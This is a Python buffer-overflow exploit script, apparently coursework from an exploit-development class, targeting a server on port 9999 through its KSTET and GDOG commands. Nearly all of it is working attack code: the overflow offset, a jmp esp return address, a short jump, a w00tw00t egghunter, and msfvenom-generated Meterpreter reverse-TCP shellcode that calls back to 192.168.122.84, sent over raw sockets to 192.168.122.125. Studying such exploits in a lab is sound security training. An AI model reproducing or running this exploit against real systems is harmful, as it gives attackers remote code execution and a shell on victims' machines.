# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

import sys
import socket

#Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A

#evilString = "A" * 700
evilString = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"
#root@kali-rolling-amd64:~/Documents/exploitdev-udemy# msf-pattern_offset -q 63413363
#[*] Exact match at offset 70
evilString = "A" * 70 + "B" * 4 + "C" * (700-74)
# 626011c7 is the return address given by jmpcall
# \xc7\x11\x60\x62

# Search for instruction on executing short jump back 90 bytes to move back
#nasm > jmp $-90
#00000000  EBA4              jmp short 0xffffffa6
# We later learned that it jumped back too far before the start of the egghunterfer in the EAX register so we adjust the jmp to 70 bytes instead to land directly in EAX register
#nasm > jmp $-70
#00000000  EBB8              jmp short 0xffffffba


# With proper JMP ESP instruction, now additional jmps can be fed directly after.
# Remember that after you jump to ESP, you can feed jmp commands directly without little-endianizing the hex value, which only is applied to the memory address fed into EIP

# The author made a error  for the jmp esp address, it's \x50 not \x60

shellcode = "A" * 1000

evilString = "A" * 70 + "\xc7\x11\x50\x62" + "\xEB\xB8\x90\x90" + "C" * 150

# The A's are replaced with a nop sled of the same length. Clearly the GDOG command is meant to cause the registers to absorb it in a different way, he should have explained us this but he didn't
evilString = "\x90" * 70 + "\xc7\x11\x50\x62" + "\xEB\xB8\x90\x90" + "C" * 150
# pattern create #2
# Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
shellcode = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
# egghunter set to w00tw00t from command msf-egghunter -f python -e w00tw00t
egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
egghunter += b"\xea\xaf\x75\xe7\xff\xe7"

#root@kali-rolling-amd64:~/Documents/exploitdev-udemy# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.84 LPORT=4444 -b '\x00' -f python
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 11 compatible encoders
#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
#x86/shikata_ga_nai succeeded with size 368 (iteration=0)
#x86/shikata_ga_nai chosen with final size 368
#Payload size: 368 bytes
#Final size of python file: 1802 bytes
buf =  b""
buf += b"\xba\xb6\x3d\x22\x71\xda\xd2\xd9\x74\x24\xf4\x5f\x31"
buf += b"\xc9\xb1\x56\x31\x57\x13\x03\x57\x13\x83\xc7\xb2\xdf"
buf += b"\xd7\x8d\x52\x9d\x18\x6e\xa2\xc2\x91\x8b\x93\xc2\xc6"
buf += b"\xd8\x83\xf2\x8d\x8d\x2f\x78\xc3\x25\xa4\x0c\xcc\x4a"
buf += b"\x0d\xba\x2a\x64\x8e\x97\x0f\xe7\x0c\xea\x43\xc7\x2d"
buf += b"\x25\x96\x06\x6a\x58\x5b\x5a\x23\x16\xce\x4b\x40\x62"
buf += b"\xd3\xe0\x1a\x62\x53\x14\xea\x85\x72\x8b\x61\xdc\x54"
buf += b"\x2d\xa6\x54\xdd\x35\xab\x51\x97\xce\x1f\x2d\x26\x07"
buf += b"\x6e\xce\x85\x66\x5f\x3d\xd7\xaf\x67\xde\xa2\xd9\x94"
buf += b"\x63\xb5\x1d\xe7\xbf\x30\x86\x4f\x4b\xe2\x62\x6e\x98"
buf += b"\x75\xe0\x7c\x55\xf1\xae\x60\x68\xd6\xc4\x9c\xe1\xd9"
buf += b"\x0a\x15\xb1\xfd\x8e\x7e\x61\x9f\x97\xda\xc4\xa0\xc8"
buf += b"\x85\xb9\x04\x82\x2b\xad\x34\xc9\x23\x02\x75\xf2\xb3"
buf += b"\x0c\x0e\x81\x81\x93\xa4\x0d\xa9\x5c\x63\xc9\xb8\x4b"
buf += b"\x94\x05\x02\x1b\x6a\xa6\x72\x35\xa9\xf2\x22\x2d\x18"
buf += b"\x7b\xa9\xad\xa5\xae\x47\xa4\x31\x91\x3f\xc2\x95\x79"
buf += b"\x3d\x33\x07\x26\xc8\xd5\x77\x86\x9a\x49\x38\x76\x5a"
buf += b"\x3a\xd0\x9c\x55\x65\xc0\x9e\xbc\x0e\x6b\x71\x68\x66"
buf += b"\x04\xe8\x31\xfc\xb5\xf5\xec\x78\xf5\x7e\x04\x7c\xb8"
buf += b"\x76\x6d\x6e\xad\xe0\x8d\x6e\x2e\x85\x8d\x04\x2a\x0f"
buf += b"\xda\xb0\x30\x76\x2c\x1f\xca\x5d\x2f\x58\x34\x20\x19"
buf += b"\x12\x03\xb6\x25\x4c\x6c\x56\xa5\x8c\x3a\x3c\xa5\xe4"
buf += b"\x9a\x64\xf6\x11\xe5\xb0\x6b\x8a\x70\x3b\xdd\x7e\xd2"
buf += b"\x53\xe3\x59\x14\xfc\x1c\x8c\x26\xfb\xe2\x52\x01\xa4"
buf += b"\x8a\xac\x11\x54\x4a\xc7\x91\x04\x22\x1c\xbd\xab\x82"
buf += b"\xdd\x14\xe4\x8a\x54\xf9\x46\x2b\x68\xd0\x07\xf5\x69"
buf += b"\xd7\x93\x06\x13\x98\x24\xe7\xe4\xb0\x40\xe8\xe4\xbc"
buf += b"\x76\xd5\x32\x85\x0c\x18\x87\xb2\x1f\x2f\xaa\x93\xb5"
buf += b"\x4f\xf8\xe4\x9f"

shellcode = "w00tw00t" + "A" * 1000
shellcode = "w00tw00t" + buf
# We subtract the size of the egghunter from the nop sled and then we add padding of 18 bytes of nop sped before the egghunter and 20 byte nop sled after the egghunter, which then is followed by jmp esp and then short jmp 70 and 150 C's
evilString = "\x90" * 18 + egghunter + "\x90"*20 + "\xc7\x11\x50\x62" + "\xEB\xB8\x90\x90" + "C" * 150

# author customized command for teaching purposes
command1 = "GDOG " + shellcode
# Finally we identified only one bad character after bruting all possible combinations and observing how they are rendered in the debugger \x00
# The null byte \x00

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('192.168.122.125',9999))
s.recv(1024)
s.send(command1)
s.close()

command2 = "KSTET " + evilString

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('192.168.122.125',9999))
s.recv(1024)
s.send(command2)
s.close()
